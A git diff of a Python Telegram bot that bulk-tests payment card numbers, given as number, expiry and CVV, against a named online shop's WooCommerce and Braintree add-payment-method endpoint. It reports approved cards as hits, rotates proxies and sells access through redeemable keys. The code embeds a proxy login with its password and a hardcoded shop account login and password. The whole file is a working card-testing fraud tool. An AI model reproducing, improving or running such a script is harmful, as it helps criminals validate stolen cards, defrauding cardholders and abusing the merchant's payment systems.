@@ -9,22 +9,23 @@ init(autoreset=True)
 # ===================== PROXIES =====================
 proxies_list = [
     "http://naveed:Qwerty_123ABC@196.244.48.124:12345",
-    # Add more proxies here if you have
+    "http://45.77.212.45:8080",
+    "http://103.152.232.140:80",
+    "http://20.206.106.192:80",
 ]
 
 def get_proxy():
     if not proxies_list:
-        print(Fore.RED + "[PROXY] No proxy loaded!")
+        print(Fore.RED + "[PROXY] No proxy available!")
         return None
     proxy = random.choice(proxies_list)
     print(Fore.CYAN + f"[PROXY] Using: {proxy}")
     return {"http": proxy, "https": proxy}
 
-# ===================== CHECKER WITH FULL LOGS =====================
+# ===================== CHECKER =====================
 def Tele(cx):
     proxy = get_proxy()
     print(Fore.YELLOW + f"[CHECKING] {cx}")
-    
     try:
         cc, mes, ano, cvv = cx.split("|")
         if len(ano) == 4: ano = ano[2:]
@@ -35,45 +36,30 @@ def Tele(cx):
 
         headers = {'User-Agent': ua}
 
-        print(Fore.BLUE + "[LOG] Step 1: Opening site...")
+        print(Fore.BLUE + "[LOG] Step 1: Login...")
         r.get("https://www.woolroots.com/my-account/", headers=headers, timeout=20)
-
         login_page = r.get("https://www.woolroots.com/my-account/", headers=headers, timeout=20)
-        login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.+?)"', login_page.text)
-        if not login_nonce:
-            print(Fore.RED + "[ERROR] Login nonce not found!")
-            return "Login Failed"
-        login_nonce = login_nonce.group(1)
+        login_nonce = re.search(r'name="woocommerce-login-nonce" value="(.+?)"', login_page.text).group(1)
 
-        print(Fore.BLUE + "[LOG] Step 2: Logging in...")
         r.post('https://www.woolroots.com/my-account/', data={
             'username': 'Chitnge228', 'password': 'Chitnge834',
             'woocommerce-login-nonce': login_nonce, '_wp_http_referer': '/my-account/', 'login': 'Log in'
         }, headers=headers, timeout=20)
 
-        print(Fore.BLUE + "[LOG] Step 3: Opening payment page...")
+        print(Fore.BLUE + "[LOG] Step 2: Add Payment Page...")
         add_page = r.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers, timeout=20)
-        client_nonce = re.search(r'"client_token_nonce":"(.+?)"', add_page.text)
-        if not client_nonce:
-            print(Fore.RED + "[ERROR] Client nonce failed")
-            return "Client Token Failed"
-        client_nonce = client_nonce.group(1)
+        client_nonce = re.search(r'"client_token_nonce":"(.+?)"', add_page.text).group(1)
 
-        print(Fore.BLUE + "[LOG] Step 4: Getting Braintree Token...")
+        print(Fore.BLUE + "[LOG] Step 3: Braintree Token...")
         token_resp = r.post('https://www.woolroots.com/wp-admin/admin-ajax.php', 
                            data={'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce}, 
                            headers=headers, timeout=20)
 
-        bt_data = re.search(r'"data":"(.+?)"', token_resp.text)
-        if not bt_data:
-            print(Fore.RED + "[ERROR] Braintree data failed")
-            return "Braintree Failed"
-        bt_data = bt_data.group(1)
-
+        bt_data = re.search(r'"data":"(.+?)"', token_resp.text).group(1)
         decoded = base64.b64decode(bt_data).decode('utf-8')
         auth = re.search(r'"authorizationFingerprint":"(.+?)"', decoded).group(1)
 
-        print(Fore.BLUE + "[LOG] Step 5: Tokenizing card...")
+        print(Fore.BLUE + "[LOG] Step 4: Tokenizing Card...")
         json_data = {
             "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token }}",
             "variables": {"input": {"creditCard": {"number": cc,"expirationMonth": mes,"expirationYear": ano,"cvv": cvv},"options": {"validate": False}}},
@@ -87,7 +73,7 @@ def Tele(cx):
 
         nonce = tokenize.json()['data']['tokenizeCreditCard']['token']
 
-        print(Fore.BLUE + "[LOG] Step 6: Adding payment method...")
+        print(Fore.BLUE + "[LOG] Step 5: Final Add...")
         final_page = r.get("https://www.woolroots.com/my-account/add-payment-method/", headers=headers, timeout=20)
         add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.+?)"', final_page.text).group(1)
 
@@ -99,7 +85,7 @@ def Tele(cx):
         }, headers=headers, timeout=25)
 
         if "New payment method added" in response.text or "81724" in response.text:
-            print(Fore.GREEN + f"[HIT] {cc} → Approved!")
+            print(Fore.GREEN + f"[HIT] {cc}")
             return "Approved - New Card Added"
         elif "avs" in response.text.lower():
             print(Fore.YELLOW + f"[AVS] {cc}")
@@ -109,7 +95,7 @@ def Tele(cx):
             return "Declined"
 
     except Exception as e:
-        print(Fore.RED + f"[ERROR] {cx} → {str(e)}")
+        print(Fore.RED + f"[ERROR] {str(e)}")
         return f"Error: {str(e)[:100]}"
 
 # ===================== BOT =====================
@@ -122,7 +108,7 @@ valid_keys = {"B3-2026-PREMIUM", "SONALI123", "FREE2026", "GATEAU2026"}
 
 @bot.message_handler(commands=["start"])
 def welcome(message):
-    bot.send_message(message.chat.id, "𓆩 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𓆪\nAdvanced Logs Active")
+    bot.send_message(message.chat.id, "𓆩 𝐏𝐫𝐞𝐦𝐢𝐮𝐦 𓆪\nLogs Active")
 
 @bot.message_handler(commands=["key"])
 def redeem_key(message):
@@ -143,7 +129,7 @@ def add_key(message):
     try:
         new_key = message.text.split()[1]
         valid_keys.add(new_key)
-        bot.reply_to(message, f"✅ New Key Added: {new_key}")
+        bot.reply_to(message, f"✅ New Key: {new_key}")
     except:
         bot.reply_to(message, "Usage: /addkey NEWKEY")
 
@@ -155,7 +141,6 @@ def check(message):
 
     sto["stop"] = False
     name = message.from_user.first_name or "User"
-    print(Fore.MAGENTA + f"\n[NEW SESSION] {name} started checking")
 
     file_info = bot.get_file(message.document.file_id)
     downloaded = bot.download_file(file_info.file_path)
@@ -165,7 +150,7 @@ def check(message):
         cards = [line.strip() for line in f if line.strip()]
 
     ok = 0
-    ko = bot.reply_to(message, f"🔥 Checking Started!\nTotal Cards: {len(cards)}").message_id
+    ko = bot.reply_to(message, f"🔥 Started by {name}\nCards: {len(cards)}").message_id
 
     def worker(cc):
         nonlocal ok
@@ -196,7 +181,6 @@ def check(message):
         t.join()
 
     bot.reply_to(message, f"✅ Finished!\nHits: {ok}")
-    print(Fore.GREEN + f"[SESSION END] Hits: {ok}")
 
 @bot.message_handler(commands=["stop"])
 def stopit(message):
@@ -204,7 +188,5 @@ def stopit(message):
     bot.reply_to(message, "✅ Stopped")
 
 keep_alive()
-print("✅ Bot Started with Full Logs")
+print("✅ Bot Started")
 bot.infinity_polling()
-
-        tokenize
